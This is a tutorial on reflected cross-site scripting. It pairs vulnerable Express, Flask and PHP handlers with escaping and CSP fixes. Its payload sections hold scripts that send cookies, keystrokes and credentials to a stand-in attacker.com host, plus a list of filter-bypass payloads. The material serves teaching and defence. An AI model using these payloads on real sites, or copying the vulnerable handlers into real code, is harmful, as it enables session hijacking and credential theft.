# Understanding Reflected XSS: A Practical Deep Dive

Good security knowledge requires understanding attacks, not just definitions. Here's a thorough breakdown.

## What Reflected XSS Actually Is

The browser **trusts content from the server**. If the server echoes user input into HTML without sanitization, the browser can't distinguish your content from the site's content.

---

## The Vulnerable Server Code

### Node.js/Express (vulnerable)
```javascript
// VULNERABLE - Don't write this
app.get('/search', (req, res) => {
  const query = req.query.q;  // Raw user input

  res.send(`
    <html>
      <body>
        <h1>Search Results for: ${query}</h1>
        <!-- Results here -->
      </body>
    </html>
  `);
});
```

### Python/Flask (vulnerable)
```python
# VULNERABLE - Don't write this
@app.route('/search')
def search():
    query = request.args.get('q', '')
    # Markup() tells Jinja2 "trust this, don't escape it"
    return render_template_string(
        '<h1>Results for: ' + query + '</h1>'  # String concat bypasses escaping
    )
```

### PHP (vulnerable)
```php
<!-- VULNERABLE - Don't write this -->
<h1>Results for: <?php echo $_GET['q']; ?></h1>
```

---

## Real Payloads and Why They Work

### Basic payload
```
/search?q=<script>alert('XSS')</script>
```

**What the server sends to the browser:**
```html
<h1>Search Results for: <script>alert('XSS')</script></h1>
```

The browser's HTML parser hits `<script>`, switches to JS parsing mode, and executes it. The browser has no idea this wasn't intentional.

---

### Why `alert()` understates the real risk

Real attackers don't pop alerts. Here's what actually happens:

```javascript
// Session hijacking - sends your cookies to attacker's server
<script>
  new Image().src = 'https://attacker.com/steal?c=' + document.cookie;
</script>

// Keylogger - captures everything typed on the page
<script>
  document.addEventListener('keydown', e => {
    fetch('https://attacker.com/log', {
      method: 'POST',
      body: JSON.stringify({key: e.key, url: location.href})
    });
  });
</script>

// Credential harvesting - replaces login form with fake one
<script>
  document.body.innerHTML = `
    <form action="https://attacker.com/harvest" method="POST">
      <input name="user" placeholder="Username">
      <input name="pass" type="password" placeholder="Password">
      <button>Login</button>
    </form>
  `;
</script>
```

---

### Filter bypass payloads (why naive filtering fails)

If a developer tries to block XSS by filtering `<script>`:

```html
<!-- Case variation -->
<SCRIPT>alert(1)</SCRIPT>
<ScRiPt>alert(1)</ScRiPt>

<!-- Event handlers - no <script> tag needed -->
<img src="x" onerror="alert(1)">
<svg onload="alert(1)">
<body onpageshow="alert(1)">
<input autofocus onfocus="alert(1)">

<!-- Broken tag that browsers still parse -->
<scr<script>ipt>alert(1)</scr</script>ipt>

<!-- JavaScript URI -->
<a href="javascript:alert(1)">Click me</a>

<!-- Encoding tricks -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
```

**The lesson:** You cannot blocklist your way to safety. There are hundreds of variations.

---

## The Correct Server Code

### Node.js/Express (safe)
```javascript
import escapeHtml from 'escape-html';
// or use a templating engine that auto-escapes

app.get('/search', (req, res) => {
  const query = escapeHtml(req.query.q || '');

  res.send(`
    <html>
      <head>
        <!-- Defense in depth: CSP header -->
      </head>
      <body>
        <h1>Search Results for: ${query}</h1>
      </body>
    </html>
  `);
});

// Better: use a templating engine
app.get('/search', (req, res) => {
  // Handlebars, EJS, Pug all auto-escape by default
  res.render('search', { query: req.query.q });
  // In template: {{query}} is safe, {{{query}}} is NOT
});
```

### Python/Flask (safe)
```python
from markupsafe import escape

@app.route('/search')
def search():
    query = escape(request.args.get('q', ''))
    # Jinja2 templates auto-escape by default - use them
    return render_template('search.html', query=query)
    # In template: {{ query }} is safe, {{ query|safe }} is NOT
```

### What escaping actually does
```
Input:  <script>alert(1)</script>
Output: &lt;script&gt;alert(1)&lt;/script&gt;
```
The browser renders this as literal text, not HTML tags.

---

## Defense in Depth: Content Security Policy

Even if XSS gets through, CSP limits the damage:

```javascript
// Express middleware
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    [
      "default-src 'self'",           // Only load resources from your domain
      "script-src 'self'",            // No inline scripts, no external scripts
      "object-src 'none'",            // No Flash/plugins
      "base-uri 'self'",              // Prevent base tag injection
    ].join('; ')
  );
  next();
});
```

With this CSP, inline `<script>` tags **won't execute** even if injected, because the policy requires scripts to come from `'self'` only.

---

## Quick Reference: What to Never Do

| Pattern | Why It's Dangerous |
|---|---|
| `innerHTML = userInput` | Parses and executes HTML |
| `document.write(userInput)` | Same problem |
| `eval(userInput)` | Executes arbitrary JS |
| `href = userInput` | Can be `javascript:` URI |
| Template string with raw input | Bypasses engine escaping |
| `\|safe` / `Markup()` / `{{{var}}}` | Explicitly disables escaping |

## Safe Alternatives

```javascript
// UNSAFE
element.innerHTML = userInput;

// SAFE - treats content as text, not HTML
element.textContent = userInput;

// UNSAFE
element.setAttribute('href', userInput);

// SAFE - validate it's actually a real URL first
const url = new URL(userInput);
if (['http:', 'https:'].includes(url.protocol)) {
  element.setAttribute('href', url.toString());
}
```

---

## The Mental Model That Sticks

Think of HTML as code, not data. When you concatenate user input into HTML, you're letting users **write part of your program**. Escaping converts their input from *code* to *data* — the browser displays it rather than executing it.

The rule: **escape at the point of output, in the context where it's being used** (HTML context, JS context, CSS context, and URL context all require different escaping).

